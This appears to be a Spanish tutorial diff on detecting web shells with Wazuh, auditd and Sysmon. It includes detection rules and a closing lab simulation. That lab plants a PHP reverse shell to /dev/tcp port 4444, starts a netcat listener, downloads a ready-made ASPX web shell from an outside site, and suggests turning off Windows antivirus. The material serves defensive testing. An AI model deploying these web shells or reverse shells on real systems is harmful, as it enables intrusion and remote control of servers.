@@ -192,3 +192,308 @@ Además, FIM escanea los contenidos de los archivos para monitorizar la aparció
 ### Usando reglas personalizadas para detectar indicios de web shells
 
 Wazuh permite escribir reglas personalizadas que disparan alertas cuando se detectan determinadas características en logs. Además integraremos Wazuh con **auditd** en endpoints Linux y **Sysmon** en Windows para enriquecer los fuentes de logs, para así mejorar la seguridad.
+
+#### Ubuntu
+
+**Auditd** (de Linux Audit Daemon) es una utilidad que recopila y almacena eventos del sistema tales como llamadas al sistema (*syscall*) y funciones. Usando auditd podemos monitorizar comandos del sistema así como conexciones de red que lleve a cabo un usuario de servidor web, escribiendo reglas que generen una alerta cuando esto ocurra.
+
+Así las cosas:
+
+1. Actualizar los paquetes de los respositorios e instalar **auditd**:
+
+    ```console 
+    $ sudo apt update
+    $ sudo apt install auditd
+    ```
+
+2. Enviar los logs de *auditd* al servidor de Wazuh para su análisis, añadiendo para ello la siguiente configuración al agente de Wazuh en el archivo `/var/ossec/etc/ossec.conf`:
+
+    ```xml
+    <ossec_config>
+    <localfile>
+        <location>/var/log/audit/audit.log</location>
+        <log_format>audit</log_format>
+    </localfile>
+    </ossec_config>
+    ```
+
+3. Obtener el identificador dle usuario del servidor web Apache ejecutando el siguiente comando:
+
+    ```console
+    $ sudo apachectl -S
+    ```
+
+    ???note "Salida"
+
+        ```sh hl_lines="12"
+        VirtualHost configuration:
+        *:80                   127.0.1.1 (/etc/apache2/sites-enabled/000-default.conf:1)
+        ServerRoot: "/etc/apache2"
+        Main DocumentRoot: "/var/www/html"
+        Main ErrorLog: "/var/log/apache2/error.log"
+        Mutex mpm-accept: using_defaults
+        Mutex watchdog-callback: using_defaults
+        Mutex default: dir="/var/run/apache2/" mechanism=default 
+        PidFile: "/var/run/apache2/apache2.pid"
+        Define: DUMP_VHOSTS
+        Define: DUMP_RUN_CFG
+        User: name="www-data" id=33
+        Group: name="www-data" id=33
+        ```
+
+4. Añadir al archivo de configuración de *auditd* `/etc/audit/rules.d/audit.rules`, usando el id de usuario en el paso 3, lo siguiente:
+
+    ```sh
+    ## Auditd rules that detect command execution from user www-data.
+    -a always,exit -F arch=b32 -S execve -F uid=<USER_ID> -F key=webshell_command_exec
+    -a always,exit -F arch=b64 -S execve -F uid=<USER_ID> -F key=webshell_command_exec
+
+    ## Auditd rules that detect network connections from user www-data.
+    -a always,exit -F arch=b64 -S socket -F a0=10 -F euid=<USER_ID> -k webshell_net_connect
+    -a always,exit -F arch=b64 -S socket -F a0=2 -F euid=<USER_ID> -k webshell_net_connect
+    -a always,exit -F arch=b32 -S socket -F a0=10 -F euid=<USER_ID> -k webshell_net_connect
+    -a always,exit -F arch=b32 -S socket -F a0=2 -F euid=<USER_ID> -k webshell_net_connect
+    ```
+
+5. Reiniciar *auditd* y el agente de Wazuh para aplicar los cambios en la configuración:
+
+```console
+$ sudo systemctl restart auditd
+$ sudo systemctl restart wazuh-agent
+```
+
+#### Windows
+
+System Monitor (Sysmon) es un servicio de sistema de Windows que monitoriza y registra la actividad del sistema en los logs de eventos de Windows.
+
+Complementa los logs con información detallada sobre la creación de procesos o conexiones de red, entre otros. Por ejemplo, Sysmon puede monitorizar el proceso `w3wp.exe,`componente fundamental del servidor web de Microsoft Internet Information Services (IIS). Este proceso se encarga de manejar las solicitudes HTTP recibidas por el servidor web y de procesarlas para generar las respuestas correspondientes.
+
+IIS tiene una funcionalidad de seguridad llamada *application pool* que permite que un pool de aplicaciones se ejecuten únicamente con una única cuenta, cuyo nombre por defecto es `DefaultAppTool`. 
+
+Con esta cuenta, el proceso de IIS corre exclusivamente con privilegios de usuario. Los atacantes suelen aprovechar este proceso para abrir terminales de **PowerShell** o **cmd**. 
+
+Explicado lo anterior, para configurar Sysmon y que Wazuh procese sus logs, haremos:
+
+1. Descargar en nuestra máquina Windows el instalador de [Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) y el [archivo de configuración que necesitamos](https://wazuh.com/resources/blog/emulation-of-attack-techniques-and-detection-with-wazuh/sysmonconfig.xml)
+
+2. Instalar Sysmon, usando la configuración descargada, mediante un terminal de PowerShell corriendo con privilegios de administrador:
+
+```console
+> .\Sysmon64.exe -accepteula -i sysmonconfig.xml
+```
+
+3. Añadir las siguientes líneas de configuración al archivo `C:\Program Files (x86)\ossec-agent\ossec.conf`, encargado de la captura y redireción de logs de Sysmon hacia el servidor de Wazuh:
+
+```xml
+<ossec_config>
+  <localfile>
+    <location>Microsoft-Windows-Sysmon/Operational</location>
+    <log_format>eventchannel</log_format>
+  </localfile>
+</ossec_config>
+```
+
+4. Reiniciar el agente de Wazuh para aplicar los cambios en la configuración:
+
+
+    ```powershell
+    > Restart-Service -Name wazuh
+    ```
+
+#### Amazon Linux 2 (Wazuh server)
+
+1. Añadir al archivo de configuración `/var/ossec/etc/rules/reglas_webshell.xml`, las siguientes reglas que intenta detectar comandos ejecutados por una web shell, así como conexiones de red establecidas:
+
+    ???note "reglas_webshell.xml"
+        ```xml
+        <!-- Reglas Linux. -->
+        <group name="auditd, linux, webshell,">
+        <!-- Eta regla detecta comandos ejecutados por una web shell -->
+        <rule id="100520" level="12">
+            <if_sid>80700</if_sid>
+            <field name="audit.key">webshell_command_exec</field>
+            <description>[Command execution ($(audit.exe))]: Possible web shell attack detected</description>
+            <mitre>
+            <id>T1505.003</id>
+            <id>T1059.004</id>
+            </mitre>
+        </rule>
+        <!-- Esta regla detecta conexiones de red realizadas por una web shell -->
+        <rule id="100521" level="12">
+            <if_sid>80700</if_sid>
+            <field name="audit.key">webshell_net_connect</field>
+            <description>[Network connection via $(audit.exe)]: Possible web shell attack detected</description>
+            <mitre>
+            <id>TA0011</id>
+            <id>T1049</id>
+            <id>T1505.003</id>
+            </mitre>
+        </rule>
+        </group>
+
+        <!-- Reglas Windows -->
+        <group name="sysmon, webshell, windows,">
+        <!-- Esta regla detecta comandos ejecutados por una web shell  -->
+        <rule id="100530" level="12">
+            <if_sid>61603</if_sid>
+            <field name="win.eventdata.parentImage" type="pcre2">(?i)w3wp\.exe</field>
+            <field name="win.eventdata.parentUser" type="pcre2">(?i)IIS\sAPPPOOL\\\\DefaultAppPool</field>
+            <description>[Command execution ($(win.eventdata.commandLine))]: Possible web shell attack detected</description>
+            <mitre>
+            <id>T1505.003</id>
+            <id>T1059.004</id>
+            </mitre>
+        </rule>
+
+        <!-- Esta regla detecta conexiones de red realizadas por una web shell -->
+        <rule id="100531" level="12">
+            <if_sid>61605</if_sid>
+            <field name="win.eventdata.image" type="pcre2">(?i)w3wp\.exe</field>
+            <field name="win.eventdata.user" type="pcre2">(?i)IIS\sAPPPOOL\\\\DefaultAppPool</field>
+            <description>[Network connection]: Possible web shell attempting network connection on source port: $(win.eventdata.sourcePort) and destination port: $(win.eventdata.destinationPort)</description>
+            <mitre>
+            <id>TA0011</id>
+            <id>T1049</id>
+            <id>T1505.003</id>
+            </mitre>
+        </rule>
+        </group>
+        ```
+
+4. Reiniciar el manager de Wazuh para aplicar los cambios en la configuración:
+
+
+    ```console
+    $ sudo systemctl restart wazuh-manager
+    ```
+
+### Usando monitorización de comandos para detectar las conexiones de red de un posible ataque
+
+En esta sección usaremos la monitorización de comandos para complementar el uso de *auditd* en el endpoint Linux. Nos servirá para obtener información adicional sobre las direcciones IP/puertos desde los que se originan los ataques.
+
+#### Ubuntu
+
+1. Añadir las siguientes configuraciones al archivo de configuración del agente Wazuh `/var/ossec/etc/ossec.conf`. Esto determina el comando que se ejecutará en el endpoint:
+
+    ```xml
+    <ossec_config>
+    <localfile>
+        <log_format>full_command</log_format>
+        <command>ss -nputw | egrep '"sh"|"bash"|"csh"|"ksh"|"zsh"' | awk '{ print $5 "|" $6 }'</command>
+        <alias>webshell connections</alias>
+        <frequency>120</frequency>
+    </localfile>
+    </ossec_config>
+    ```
+2.  Reiniciar el agente de Wazuh par aplicar los cambios de configuración:
+
+    ```console
+    $ sudo systemctl restart wazuh-agent
+    ```
+
+#### Amazon Linux 2 (Wazuh server)
+
+1. Añadir, en el archivo de configuración `/var/ossec/etc/decoders/local_decoder.xml` los siguientes decodificadores para decodificar patrones de conexiones de red establecidas por web shells en los servidores web:
+
+    ```xml
+    <!-- Decodificar para las conexiones de red de web shells -->
+    <decoder name="network-traffic-child">
+      <parent>ossec</parent>
+      <prematch offset="after_parent">^output: 'webshell connections':</prematch>
+      <regex offset="after_prematch" type="pcre2">(\d+.\d+.\d+.\d+):(\d+)\|(\d+.\d+.\d+.\d+):(\d+)</regex>
+      <order>local_ip, local_port, foreign_ip, foreign_port</order>
+    </decoder>
+    ```
+   
+2. Añadir al archivo de configuración `/var/ossec/etc/rules/reglas_webshell.xml`, las siguientes reglas que intentna detectar conexiones de red establecidas por web shells en los servidores web:
+
+    ```xml 
+    <!-- Regla detectar conexiones red web shells -->
+    <group name="linux, webshell,">
+      <rule id="100510" level="12">
+        <decoded_as>ossec</decoded_as>
+        <match>ossec: output: 'webshell connections'</match>
+        <description>[Network connection]: Script attempting network connection on source port: $(local_port) and destination port: $(foreign_port)</description>
+        <mitre>
+          <id>TA0011</id>
+          <id>T1049</id>
+          <id>T1505.003</id>
+       </mitre>
+      </rule>
+    </group>
+    ```
+
+3. Reiniciar el manager de Wazuh para aplicar los cambios en la configuración:
+
+    ```console
+    $ sudo systemctl restart wazuh-manager
+    ```
+
+## Simulación de ataque
+
+A continuación se detallan los pasos para simular como funcionan las web shells en los endpoints comprometidos.
+
+### Pasos para simular el ataque contra el endpoint Ubuntu
+
+#### Ubuntu
+
+Ejecutar los siguientes pasos con privilegio de *root*.
+
+1. Crear un archivo, por ejemplo `webshell.php` en el directorio del servidor web `/var/www/html` con la siguiente línea de código que ejecutará una shell inversa:
+
+    ```php
+    echo -e "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/<IP_DEBIAN>/4444 0>&1\"');?>" > /var/www/html/webshell.php
+    ```
+
+#### Debian
+
+1. En el terminal de nuestra Debian utilizaremos netcat (nc, instaladlo si no lo está) para escuchar conexiones en el puerto **4444**:
+
+    ```bash
+    $ nc -nlvp 4444
+    ```
+
+2. Ejecutar la web shell desde nuestro navegador accediendo a la URL `http://<IP_UBUNTU>/webshell.php`, de tal forma que se establezca una shell inversa con el endpoint Ubuntu hacia nuestra Debian atacante.
+
+
+3. En el terminal que nos aparecerá en el netcat de nuestra Debian, ejecutar varios comandos tales como `id`, `cat /etc/passwd`, `whoami`...
+
+
+#### Ver las alertas
+
+En el dashboard de Wazuh, navegar a ***Security events*** y visualizar las alertas generadas:
+
+
+### Pasos para simular el ataque contra el endpoint Windows
+
+#### Windows
+
+!!!warning "Atención"
+    Es más que probable que necesitéis desactivar el antivirus y la detección de amenazas de Windows para que os funcione esta parte.
+
+Ejecutar los siguientes pasos en una terminal de PowerShell ejecutándose como administrador:
+
+1. Descargar una copia de una web shell en el directorio del servidor web `C:\inetput\wwwroot` y llamarla, por ejemplo, `webshell.aspx`:
+
+    ```powershell
+    > Invoke-WebRequest -OutFile 'C:\Users\Public\Downloads\webshell.aspx' -Uri https://privdayz.com/cdn/txt/aspx.txt
+    > copy 'C:\Users\Public\Downloads\webshell.aspx' 'C:\inetpub\wwwroot\webshell.aspx'
+    ```
+
+#### Debian
+
+1. En el terminal de nuestra Debian escuchamos conexiones en el puerto **4444**:
+
+    ```bash
+    $ nc -nlvp 4444
+    ```
+
+2. Acceder a la web shell desde nuestro navegador mediante la URL `http://<IP_WINDOWS>/webshell.aspx`.
+
+    La contraseña de la web shell es **admin**. En el menú *CmdShell*, ejecuta comandos tales como `whoami`, `ipconfig`...
+
+3. En el menú *PortMap*, introducir la IP de nuestra Debian como **Remote IP**, `4444` como **Remote Port** y `5555` como **Local Port**. Tras ello, pulsar **MapPort**
+
+#### Ver las alertas
+
+En el dashboard de Wazuh, navegar a ***Security events*** y visualizar las alertas generadas:
